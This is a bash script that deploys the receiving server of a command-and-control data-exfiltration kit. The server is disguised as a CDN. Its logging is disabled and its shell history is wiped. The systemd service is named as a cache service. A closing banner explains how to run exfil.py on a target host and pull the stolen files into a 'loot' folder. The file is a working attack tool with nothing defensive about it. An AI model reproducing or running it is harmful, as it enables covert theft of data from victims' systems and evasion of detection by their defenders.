#!/usr/bin/env bash
# ──── GHOST-HUNT // C2 KIT — HTTPS Receiver Bootstrap (Playbook §12.1.2) ────
# One-shot server deployment. Run as root on Ubuntu 22.04+.
#   bash bootstrap-server.sh [server.env]
# Generates a Fernet key if not supplied. Prints URL + KEY + self-test result on success.
set -euo pipefail

# ── 0. Load config ───────────────────────────────────────────────────────────
ENV_FILE="${1:-server.env}"
if [[ -f "$ENV_FILE" ]]; then
  set -a; source "$ENV_FILE"; set +a
else
  echo "[!] No env file at '$ENV_FILE' — relying on exported environment vars"
fi

: "${DOMAIN:?Set DOMAIN in $ENV_FILE (e.g. cdn-analytics-xyz.com)}"
EMAIL="${EMAIL:-admin@$DOMAIN}"
ALLOW_SSH="${ALLOW_SSH:-yes}"

[[ $EUID -eq 0 ]] || { echo "[!] Run as root (sudo bash bootstrap-server.sh ...)"; exit 1; }

if [[ -z "${FERNET_KEY:-}" ]]; then
  echo "[*] Generating fresh Fernet key"
  FERNET_KEY=$(python3 -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())")
fi

echo "[*] Bootstrapping HTTPS C2 on $DOMAIN"

# ── 0b. Kit dir — handler.py must sit next to this script (deployed in step 5) ─
KIT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
[[ -f "$KIT_DIR/handler.py" ]] || {
  echo "[!] handler.py not found next to bootstrap-server.sh — copy the whole kit dir";
  exit 1;
}

# ── 1. Packages ──────────────────────────────────────────────────────────────
apt update -qq
DEBIAN_FRONTEND=noninteractive apt install -y -qq nginx certbot python3 python3-pip ufw >/dev/null
python3 -m pip install -q cryptography \
  || python3 -m pip install -q --break-system-packages cryptography   # Ubuntu 24.04+ PEP 668

# ── 2. Firewall — deny-all inbound; open 80 (certbot/renewal), 443, optional 22 ──
# Order matters: `ufw reset` DISABLES the firewall, so the allow rules must be
# staged BEFORE `ufw enable`. Enabling immediately after reset means any later
# failure (e.g. certbot) leaves the box deny-all — only a failure inside the
# two commands between reset and enable could still leave ufw off.
ufw --force reset >/dev/null
ufw allow 80/tcp  >/dev/null    # HTTP-01 challenge + auto-renew (playbook §12.1.2 omitted this — required)
ufw allow 443/tcp >/dev/null
[[ "$ALLOW_SSH" == "yes" ]] && ufw allow 22/tcp >/dev/null
ufw --force enable >/dev/null
ufw default deny incoming >/dev/null
ufw default allow outgoing >/dev/null

# ── 3. TLS — Let's Encrypt (standalone needs port 80 free + open, handled above) ──
# apt install nginx auto-starts it on :80 — stop it or certbot standalone fails
systemctl stop nginx 2>/dev/null || true
certbot certonly --standalone -d "$DOMAIN" --non-interactive --agree-tos \
  --email "$EMAIL" --quiet
# nginx is (re)started below once its config references the new cert

# ── 4. NGINX — CDN-mimic front ───────────────────────────────────────────────
mkdir -p /var/www/cdn-assets
echo '{"service":"cdn-assets","status":"ok"}' > /var/www/cdn-assets/index.json

cat > /etc/nginx/sites-available/c2 <<NGINXEOF
server {
    listen 443 ssl http2;
    server_name $DOMAIN;

    ssl_certificate     /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # Mimic CDN — 404 on GET, accept POSTs only
    location / {
        if (\$request_method = GET) { return 404; }
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header X-Forwarded-For \$remote_addr;
        client_max_body_size 100M;
    }

    # Legitimate-looking health + static endpoints
    location /health  { return 200 '{"status":"ok"}'; add_header Content-Type application/json; }
    location /static/ { root /var/www/cdn-assets; autoindex off; }

    access_log off;
    error_log /dev/null;
}
NGINXEOF

ln -sf /etc/nginx/sites-available/c2 /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl restart nginx

# ── 5. Chunk receiver (single source of truth: kit handler.py) ───────────────
# Keyless by design: chunks are Fernet-token slices, stored encrypted-at-rest;
# the key lives only on the target (exfil.py) and the operator (pull.py).
mkdir -p /opt/c2/incoming
cp "$KIT_DIR/handler.py" /opt/c2/handler.py
chmod 755 /opt/c2/handler.py
# handler runs as nobody behind nginx — it must be able to traverse /opt/c2
chmod 755 /opt/c2

# ── 6. systemd — auto-restart, masked as a CDN cache service ─────────────────
cat > /etc/systemd/system/cdn-cache.service <<SVC
[Unit]
Description=CDN Cache Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /opt/c2/handler.py
# no C2_KEY here — the handler is keyless (stores encrypted slices)
Restart=always
RestartSec=5
User=nobody
WorkingDirectory=/opt/c2
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
ReadWritePaths=/opt/c2/incoming

[Install]
WantedBy=multi-user.target
SVC

systemctl daemon-reload
systemctl enable cdn-cache --now

# ── 7. OpSec hardening ───────────────────────────────────────────────────────
chown -R nobody:nogroup /opt/c2/incoming
chmod 700 /opt/c2/incoming
unset HISTFILE
history -c 2>/dev/null || true
rm -f ~/.bash_history

# ── 8. Self-test: health + encrypted POST round-trip ─────────────────────────
echo "[*] Self-test: health endpoint + POST round-trip"
HEALTH=$(curl -sk "https://$DOMAIN/health" || true)
echo "    GET  /health -> ${HEALTH:-FAILED}"

TEST_FILE="/tmp/c2_selftest_$$.bin"
python3 - "$FERNET_KEY" "$TEST_FILE" <<'PYEOF'
import sys
from cryptography.fernet import Fernet
key, path = sys.argv[1], sys.argv[2]
open(path, 'wb').write(Fernet(key.encode()).encrypt(b'GHOST-HUNT selftest payload'))
PYEOF
curl -sk -X POST "https://$DOMAIN/" --data-binary @"$TEST_FILE" \
     -H 'Content-Type: application/octet-stream' >/dev/null && \
  ls /opt/c2/incoming/*_0.bin >/dev/null 2>&1 && \
  echo "    POST /     -> round-trip OK (chunk stored in /opt/c2/incoming)" || \
  echo "    POST /     -> FAILED — check ufw, nginx, journalctl -u cdn-cache"
rm -f "$TEST_FILE"

# ── 9. Banner ────────────────────────────────────────────────────────────────
echo ""
echo "╔══════════════════════════════════════╗"
echo "║  C2 ACTIVE                          ║"
echo "╠══════════════════════════════════════╣"
echo "║  URL:    https://$DOMAIN"
echo "║  KEY:    $FERNET_KEY"
echo "║  STATUS: $(systemctl is-active cdn-cache)"
echo "╚══════════════════════════════════════╝"
echo ""
echo "Next:"
echo "  target:  C2_HOST=$DOMAIN C2_KEY=<key above> python3 exfil.py <files>"
echo "  pull:    scp root@<VPS>:/opt/c2/incoming/*.bin ./loot/ && C2_KEY=<key> python3 pull.py --dir ./loot"
echo "  burn:    bash burn.sh $DOMAIN"
